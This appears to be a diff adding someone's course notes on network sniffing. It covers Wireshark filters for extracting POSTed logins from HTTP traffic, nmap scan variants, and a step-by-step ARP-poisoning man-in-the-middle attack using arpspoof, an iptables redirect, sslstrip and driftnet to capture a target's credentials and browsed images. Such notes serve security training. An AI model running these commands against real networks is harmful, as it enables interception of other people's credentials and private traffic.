@@ -1,0 +1,75 @@
+############################################### DAY8 (Sniffing) ################################################################
+
+
+----------------------------------------- WIRESHARK Tools ---------------------------------------------------------------------
+
+1. open the wireshark in the system (Already in present in the KALI)
+2. https://www.wireshark.org/ for more information (request in http://www.altoromutual.com userid : jsmith pass: demo1234)
+3. check DNS Query in the search bar
+4. check tcp query : ip.addr==192.168.0.170 && ip.addr==65.61.137.117
+5. http.request.method == POST
+6. you will get userid and password in the HTML From URL Encoded : Application/x-www-form-urlencoded
+
+###################################################################################################################################
+
+do scan :
+1. namp -vv -p20,21 -T5 192.168.0.145 -sT
+1. namp -vv -p20,21 -T5 192.168.0.145 -sS
+1. namp -vv -p20,21 -T5 192.168.0.145 -sF
+1. namp -vv -p20,21 -T5 192.168.0.145 -sX
+1. namp -vv -p20,21 -T5 192.168.0.145 -sN
+
+ip.addr =<yourip> && ip.addr=targetip
+(ip.addr==192.168.0.170 && ip.addr==192.168.0.145)
+
+####################################################################################################################################
+
+1. read in wireshark sample captures file :: https://wiki.wireshark.org/SampleCaptures
+2. cntrl+f : JPEG 
+3. save the file in local system
+4. open the file in the wireshark and analysis
+5. export objects and save image 
+
+----------- telephonic content is also there in the wireshark so if you want to hear the video/call recording 
+
+
+#################################################### Attacks #####################################################################
+arp poisoning with arpspoof and sslstrip
+--------------------------------------------------------------------------------------
+
+# locate sslstrip | grep README
+# cat /usr/share/doc/sslstrip/README
+
+open a new terminal tab,
+
+# echo "1" > /proc/sys/net/ipv4/ip_forward
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# sslstrip -a
+
+open a new terminal tab,
+
+# arpspoof -i eth0 -t <target ip> <gateway ip>
+
+open a new terminal tab,
+
+# arpspoof -i eth0 -t <gateway ip> <target ip>
+
+finally, run wireshark with filter expression as,
+
+ip.addr == <target ip> && http.request.method == POST
+
+#####################################################################################################################################
+
+
+----------->       HSTS : HSTS is policy which mean that use always https 
+----------->       arp -a to check arp posining in the windows 
+
+In order to capture images from his browsing session for http website
+# driftnet -v -i eth0
+or, to log the images in my system
+
+# diftnet -v -i eth0 -a -d /temp 
+
+
+
+
